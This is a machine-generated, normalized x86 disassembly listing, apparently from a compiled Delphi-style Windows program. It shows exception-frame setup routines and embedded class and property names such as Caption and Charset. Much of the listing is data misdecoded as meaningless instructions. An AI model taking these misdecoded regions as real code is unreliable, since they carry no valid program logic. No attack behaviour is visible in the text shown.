jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax ebx
call sub_41b4f4
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jl r-xdata
cmp eax [ esp ]
pop edx
pop eax
jb r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x2d
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0x30 ]
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
push eax
mov ecx r-xdata
pop eax
call sub_404424
mov eax [ ebp - 0x4 ]
call sub_4043d8
push eax
lea eax [ ebp - 0x4 ]
call j_sub_4045e4
mov edx eax
mov eax esi
pop ecx
call sub_41b758
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx + 0x34 ]
call sub_404300
push [ ebp - 0x14 ]
push r-xdata
push r-xdata
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x4
call sub_404498
mov eax [ ebp - 0x4 ]
call sub_4043d8
push eax
lea eax [ ebp - 0x4 ]
call j_sub_4045e4
mov edx eax
mov eax esi
pop ecx
call sub_41b758
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48257b
lea eax [ ebp - 0x8 ]
call sub_40d814
retn
jmp r-xdata
sub_4825d7
inc [ ebx ]
add [ eax ] al
add [ ebp + 0x6e ] ah
add [ fs : ebx + 0x56 ] dl
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47ef78
mov eax [ r-xdata ]
mov [ esi + 0x70 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_482620
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_482645
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48264c
retn
sub_482650
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_47ecc4
mov ecx eax
mov edx r-xdata
mov eax [ r-xdata ]
call sub_47ec90
mov dl 0x1
mov eax [ r-xdata ]
call sub_4823e0
mov ecx eax
mov edx r-xdata
mov eax [ r-xdata ]
call sub_47eee4
sub_4826a4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
daa
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] ch
dec eax
add [ eax ] bh
add [ eax ] al
xor [ edi ] bl
dec eax
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax - 0x27ffb8ae ] bh
xchg ebx eax
inc ecx
add ah dh
sbb eax 0x92f40042
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ eax + ebp ] ch
dec eax
add [ eax ] al
push esp
inc edi
add [ eax ] bh
push esp
inc edi
add [ eax + 0x54 ] ch
inc edi
add [ eax ] ah
and al 0x48
add [ esp + edx * 2 ] dl
dec ecx
dec ebp
jae r-xdata
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add [ ecx - 0x39748fba ] cl
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
add al dl
daa
pop eax
inc ebp
lea eax [ eax ]
dec eax
daa
dec eax
add [ edi ] al
adc al 0x54
dec ecx
dec ebp
jae r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
push ebx
push esi
test dl dl
je r-xdata
outsb
outsw
pop eax
pop eax
inc ebp
lea eax [ eax ]
inc eax
add ah ch
daa
dec eax
add [ ebp + ebp * 8 + 0x54180047 ] bl
dec ecx
dec ebp
or al 0x33
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
test bl bl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47ef78
mov eax [ r-xdata ]
mov [ esi + 0x70 ] eax
mov eax esi
add esp 0xfffffff0
call sub_403668
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
pushad
xor eax 0x35540040
inc eax
pop eax
inc ebp
in al dx
dec eax
add al bl
pop ds
dec eax
add [ 0x64491100 ] al
dec ebp
jae r-xdata
dec ecx
popad
inc ebx
outsd
jb r-xdata
jae r-xdata
sbb [ ecx + ecx * 2 + 0x64 ] dl
dec ebp
dec eax
add [ eax ] cl
add [ eax ] al
add al dl
0x354c0047 0x40
pop eax
inc ebp
add [ eax ] al
enter 0x4827 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ edi ] 0x1
sub_4827ec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47ed7c
mov eax [ r-xdata ]
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_48286c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_482891
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482898
retn
sub_4828c7
inc [ ebx ]
add [ eax ] al
add [ eax + 0x58 ] bl
inc ebp
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4828f5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4828fc
retn
sub_482908
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_48292d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482934
retn
sub_482940
inc esp
sub [ eax ] ecx
add edx [ edx ]
push esp
dec ecx
dec ebp
jae r-xdata
mov al 0x10
inc eax
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
popad
push eax
jb r-xdata
dec eax
add [ esi ] cl
popad
or al 0x0
outsd
jb r-xdata
add [ eax ] al
add [ ecx ] 0x0
or eax [ ebx + 0x6f ]
popad
push eax
popad
jb r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] al
sbb [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
sbb al 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] al
and [ eax ] al
add [ eax ] al
fdiv [ ebx + 0x40 ]
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax + edx + 0xc0040 ] dl
inc eax
sub cl [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
sub cl [ eax ]
mov al 0x2a
dec eax
add [ eax ] al
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ eax + 0x4c004010 ] dh
xor eax 0x35580040
je r-xdata
xor eax 0x35600040
outsb
je r-xdata
outsb
je r-xdata
lea eax [ eax ]
mov al 0x2a
dec eax
add [ edi ] al
push cs
push esp
dec ecx
dec ebp
jae r-xdata
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ esp + esi + 0x48 ] al
xor eax 0x35540040
inc eax
add [ eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
inc eax
sub [ eax ] ecx
or [ ebp + 0x70 ] ebp
dec eax
imul esp [ edi + 0x68 ] 0x6747365
insd
jo r-xdata
xor al [ eax ]
shl [ edx ] 0x1
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
add ah dh
sub [ eax ] ecx
dec esp
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
jns r-xdata
add bh bh
jo r-xdata
popad
push eax
popad
jb r-xdata
add [ eax ] al
add [ eax + eax ] cl
imul esp [ edi + 0x68 ] 0x4e706d08
outsd
jb r-xdata
add ah bl
jae r-xdata
sub ecx [ eax ]
pop es
or eax 0x41644954
je r-xdata
inc ecx
add [ eax - 0xfffb7c8 ] al
xor al [ eax ]
sar [ ecx ] 0x1
dec eax
add al bl
xchg ebx eax
inc ecx
add al ah
xchg ebx eax
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
salc
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x450c0002 ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
or al 0x45
inc eax
sub cl [ eax ]
lodsb [ esi ]
inc cx
add [ ebx ] al
add [ ecx ] cl
dec ecx
dec ebp
jae r-xdata
dec ebp
inc ebp
inc edx
outsd
jne r-xdata
popad
insb
add eax 0x6f4c706d
ja r-xdata
inc eax
add ah dl
cmp ecx [ eax ]
fcom [ ebx - 0x6c1fffbf ]
inc ecx
add ah cl
cmp cl [ eax ]
sub al 0x48
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x482c ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp + 0x48 ] bh
add [ eax + eax ] al
add ah dh
sub [ eax ] ecx
dec esp
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
add [ eax ] cl
add [ eax ] al
or eax 0x41644954
je r-xdata
int3
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
xchg esi eax
inc ecx
add al dl
xchg edi eax
inc ecx
add [ eax ] al
cwde
inc ecx
add al bh
xchg edi eax
inc ecx
add [ eax + 0xe004836 ] dh
cmp [ eax ] 0x48
inc edi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + __dos_stub ] dl
add [ eax ] al
fdiv [ ebx + 0x40 ]
mov al 0x36
dec eax
add [ esi ] cl
jb r-xdata
popad
add eax [ gs : bx + si ]
xchg esp eax
adc [ eax ] al
test al 0x37
dec eax
add [ eax + edi ] dl
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430f0000 ] al
outsd
outsb
je r-xdata
or [ ecx + 0x64 ] ecx
dec ebp
jae r-xdata
insd
jo r-xdata
inc eax
add al dl
cmp [ eax ] ecx
fcom [ ebx - 0x6c1fffbf ]
shl [ edx ] 0x1
sub ecx [ eax ]
lodsb [ esi ]
sub cl [ eax ]
add eax [ eax ]
or [ ecx + 0x64 ] ecx
dec ebp
jae r-xdata
add al dh
dec eax
popad
jb r-xdata
sub ecx [ eax ]
dec esp
add [ eax ] al
add [ ebx + ebp + 0x2be80048 ] bh
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh dl
outsb
je r-xdata
add [ eax ] ah
inc cx
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax + 0x37 ] dh
dec eax
add al bl
xchg ebx eax
inc ecx
add al ah
xchg ebx eax
inc ecx
add [ eax ] bl
dec eax
add al dh
xchg esi eax
inc ecx
add al dl
xchg edi eax
inc ecx
add [ eax ] al
cwde
inc ecx
add al bh
xchg edi eax
inc ecx
add [ eax + 0xe004836 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
0x3c00482a 0x0
popad
in al 0x29
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
sub [ eax ] ecx
add [ edi ] cl
push esp
dec ecx
dec ebp
dec ecx
xor eax 0x32b40040
inc eax
add al dl
xor al [ eax ]
inc esp
xor al 0x48
outsd
ja r-xdata
add [ edi ] al
push esp
dec ecx
push esp
js r-xdata
popad
add [ gs : bx + si ] al
lea eax [ eax ]
pop esp
add [ eax ] al
add al [ eax ]
add [ eax ] al
xchg esp eax
adc [ eax ] al
inc eax
add [ eax ] al
lea eax [ eax ]
pushfd
sub ecx [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
jb r-xdata
popad
jae r-xdata
loopne r-xdata
mov [ eax + ecx * 2 ] ch
add [ edi ] al
pop es
push esp
dec ecx
push esp
mov esp 0xe800482b
sub ecx [ eax ]
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x3c00482a ] bl
add [ eax ] al
dec eax
add [ eax + 0x482a ] dh
js r-xdata
push esp
inc ecx
add al ch
cwde
inc ecx
add [ ebp + ebx * 4 + 0x41 ] dl
add [ eax - 0x63 ] bl
inc ecx
add [ ebp + ebx * 4 + 0x41 ] bl
add [ eax ] dl
popfd
inc ecx
add [ ebx * 4 - 0x667fffbf ] dl
popfd
pop esp
sub al 0x48
add [ edx + ebp + 0x30048 ] ch
or [ ecx + 0x64 ] ecx
dec ebp
jae r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
sub eax 0x15080048
push esp
dec ecx
dec ecx
popad
push eax
popad
jb r-xdata
inc ecx
add ah bh
cdq
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x1c0040 ] dl
add [ eax ] al
andps xmm1 [ ecx + 0x64 ]
dec ebp
jae r-xdata
cdq
popad
add [ gs : bx + si ] al
nop
hlt
add [ eax ] bh
add [ eax ] al
add [ esi ] cl
push esp
dec ecx
dec ebp
jae r-xdata
adc [ eax ] al
in al 0x37
dec eax
add [ eax + 0x38 ] cl
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0001 ] al
outsd
add [ eax ] al
inc ebp
jbe r-xdata
outsb
imul esi [ ecx + ebp * 2 + 0x61 ] 0x657a696c
dec ecx
jae r-xdata
dec ecx
jae r-xdata
add al 0x42
popad
lea eax [ bx + si ]
add al 0x2f
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
dec eax
add [ eax ] dh
add [ eax ] al
add [ edi + 0x354c0041 ] ch
inc eax
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax + ebx * 4 + 0x41 ] bh
add al bl
xchg ebx eax
inc ecx
add al ah
xchg ebx eax
rol [ ebp + ebp + 0x48 ] 0x0
pop es
andps xmm1 [ ecx + 0x64 ]
dec ebp
dec eax
add [ edi ] al
or dl [ ecx + ecx * 2 + 0x64 ]
dec ebp
jae r-xdata
add [ edi + ebp ] al
inc di
add [ eax ] dh
add [ eax ] al
push [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42070004 ] al
arpl [ ebx + 0x4c ] sp
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
pop es
inc edx
popad
pushad
dec eax
add [ ebx + ecx * 2 + 0x1b0047 ] dh
or [ ecx + 0x64 ] ecx
dec ebp
jae r-xdata
add eax [ ecx ]
orps xmm2 [ edx + esi * 2 + 0x61 ]
je r-xdata
outsb
popad
push eax
popad
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
pop ss
inc ebx
je r-xdata
cmp [ eax ] al
add bh bh
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
popad
sbb [ gs : bx + si ] eax
xchg esp eax
adc [ eax ] al
add [ ebp + 0x48 ] cl
add ah dh
dec esp
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41120002 ] al
je r-xdata
add [ eax + 0x24000000 ] dh
dec ebx
dec eax
jb r-xdata
push esp
jb r-xdata
jae r-xdata
[ eax ]
dec ebp
dec eax
outsb
je r-xdata
je r-xdata
inc di
add [ eax + eax ] bh
add bh bh
cmp al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ esi ] al
inc ebx
inc ebx
dec esp
imul esi [ ebx + 0x74 ] r-xdata
inc eax
add [ eax ] al
inc [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ ebx ] cl
inc ebx
outsd
outsb
je r-xdata
inc edi
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x400482e ] bl
das
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
jae r-xdata
jae r-xdata
sub al 0x48
add [ eax + ebp * 2 ] bh
inc ecx
add [ eax ] al
add [ ecx ] cl
dec ecx
dec ebp
jae r-xdata
jge r-xdata
jb r-xdata
or al [ eax ]
add al 0x44
jb r-xdata
add [ eax - 0x80000000 ] al
add eax 0x68430700
popad
jb r-xdata
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
popad
je r-xdata
add al 0x12
inc eax
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
imul esi [ ebx + 0x74 ] r-xdata
outsd
jns r-xdata
outsb
arpl [ edi + 0x64 ] bp
imul ebp [ esi + 0x67 ] r-xdata
xor al 0x0
add bh bh
sub [ eax + 0x48 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42040003 ] al
add [ edi ] ecx
push esp
push esp
jb r-xdata
popad
add [ gs : bx + si ] al
nop
jo r-xdata
add bh bh
jge r-xdata
add [ eax ] al
dec eax
popad
jb r-xdata
inc esi
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4508000b ] al
insb
sub eax 0x600048
add bh bh
sbb [ ebp + 0x48 ] cl
outsb
jae r-xdata
outsb
jns r-xdata
add [ eax ] al
add [ eax ] al
add dl dh
dec eax
outsb
arpl [ edi + 0x64 ] bp
imul ebp [ esi + 0x67 ] 0x61684304
inc edi
add ah ch
and [ edx ] eax
and al 0x4b
outsb
jae r-xdata
push ebp
dec eax
add [ ebx ] al
adc dl [ ecx + ecx * 2 + 0x64 ]
dec ebp
jae r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
or [ esi + 0x6f ] cl
inc esp
arpl [ gs : edi + 0x64 ] bp
xchg esp eax
adc [ eax ] al
mov [ eax ] al
add bh bh
mov [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
or al 0x4f
jo r-xdata
jb r-xdata
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0011 ] al
insd
mov [ ecx + 0x41 ] ch
add [ eax ] bh
add bh bh
cmp [ eax + 0x48 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e0a000e ] al
ja r-xdata
arpl [ edi + 0x64 ] bp
imul ebp [ esi + 0x67 ] r-xdata
pop esp
add [ eax ] al
inc eax
dec esp
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
or [ ebp + 0x6e ] al
jb r-xdata
outsb
inc ebp
imul esi [ ebx + 0x70 ] 0x7469736f
imul ebp [ edi + 0x6e ] r-xdata
push eax
add [ eax ] al
call [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
outsd
outsb
je r-xdata
xchg esp eax
adc [ eax ] al
inc esp
add [ eax ] al
inc [ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43170008 ] al
push esi
inc ebx
push 0x65537261
je r-xdata
or [ esi + 0x43 ] dl
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ edi + edi - 0x6c27ffb8 ] cl
inc ecx
add ah dh
sbb eax 0x92f40042
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
jb r-xdata
add [ eax ] al
popad
nop
lodsb [ esi ]
jb r-xdata
outsd
imul ebp [ fs : esi + 0x67 ] 0x61684304
push ebp
or [ ecx + 0x64 ] ecx
dec ebp
jae r-xdata
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
imul ebp [ esi + 0x67 ] 0x1
add [ ecx ] al
add [ eax ] al
add [ ebp + ebp + 0x48 ] ch
add [ esi ] al
insd
dec ebp
dec ecx
dec ebp
inc ebp
add al 0x6d
push ebp
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
or dl [ edx + 0x65 ]
arpl [ ecx + 0x70 ] bp
popad
outsb
imul edi [ edx + 0x61 ] 0x6e6f6974
inc eax
add [ ebp ] bh
add [ eax ] dl
inc edi
add [ eax + eax ] ah
jmp [ eax + eax ]
inc eax
sub [ eax ] ecx
mov [ eax ] es
add bh bh
mov [ eax ] es
inc edi
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4404000a ] al
outsb
arpl [ edi + 0x64 ] bp
imul ebp [ esi + 0x67 ] r-xdata
dec eax
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
adc al [ ebx + 0x6f ]
outsb
je r-xdata
add [ edx + edx * 8 + 0x10280047 ] dh
inc eax
add [ eax + edx + 0x2e600040 ] dl
dec eax
push ebx
je r-xdata
push esi
dec eax
popad
jb r-xdata
orps xmm1 [ eax + 0x65 ]
popad
outsb
outsb
arpl [ ebp + 0x73 ] sp
mov [ esi + 0x47 ] fs
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x52070016 ] al
jo r-xdata
outsd
xchg esp eax
adc [ eax ] al
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53070017 ] al
jne r-xdata
imul esp [ ebp + 0x6e ] 0x10947374
inc eax
add [ eax + eax + 0x9cff00 ] bl
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax 0x65520a00
jb r-xdata
push edx
arpl [ gs : ecx + 0x70 ] bp
imul esp [ ebp + 0x6e ] 0x47668c74
add [ eax - 0x67010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x520a0014 ] al
arpl [ gs : ecx + 0x70 ] bp
outsb
jne r-xdata
add [ eax + 0x450c000c ] al
js r-xdata
je r-xdata
outsb
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ eax + 0x3e ] ch
dec eax
add [ ebp + ecx * 2 + 0x48 ] dl
add [ eax + 0x3d ] ch
dec eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
inc eax
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x740040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
mov [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
nop
add [ eax ] al
add [ eax + edx + 0x9c0040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
test al 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] al
lodsb [ esi ]
add [ eax ] al
add [ edx ] cl
push esp
dec ecx
dec ebp
jae r-xdata
imul ebp [ esi + 0x67 ] 0x47d2b400
add [ eax ] ch
adc [ eax ] al
xchg esp eax
adc [ eax ] al
pushad
dec eax
adc [ eax ] al
ror [ eax + ecx * 2 ] 0x1
call 0x1487acc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
je r-xdata
jns r-xdata
add [ eax ] al
sbb [ edx ] 0x0
cmovg ebp [ esi + 0x49 ]
jb r-xdata
push 0x65
arpl [ eax + esi * 2 + 0x65 ] si
inc edi
add [ eax + eax + 0xa4ff00 ] ah
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
push es
push ebx
outsb
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x2 ] al
adc al [ eax ]
or [ eax + 0x72 ] dl
imul ebp [ edi + 0x72 ] 0x70797469
inc edi
add [ eax + eax + 0x94ff00 ] dl
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax [ eax ]
adc [ edx + 0x65 ] dl
arpl [ ebp + 0x69 ] sp
jo r-xdata
dec eax
add [ eax + eax + 0x8cff00 ] cl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi ] dl
outsd
jb r-xdata
pushad
xor eax 0x35540040
inc eax
outsb
imul esi [ ecx + ebp * 2 + 0x61 ] 0x657a696c
dec ecx
push ebx
dec edi
lea eax [ eax ]
adc al 0x33
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x2d
dec eax
add [ eax - 0x7f010000 ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f001a ] al
outsb
dec ecx
sbb [ eax ] eax
or eax 0x4e657355
outsd
ja r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax + eax ] cl
add [ eax ] al
je r-xdata
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ ebx ] dl
inc ebp
dec ecx
dec ebp
jae r-xdata
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
adc [ eax ] al
jl r-xdata
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x33
popad
nop
popad
inc ebp
js r-xdata
add bh bh
jl r-xdata
jae r-xdata
jo r-xdata
str [ eax ]
dec esi
outsd
inc ebp
outsb
arpl [ edi + 0x64 ] bp
add [ gs : eax ] dl
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x108b0440 ] cl
call [ edx + 0x44 ]
popad
push eax
popad
jb r-xdata
inc ecx
outsb
jae r-xdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
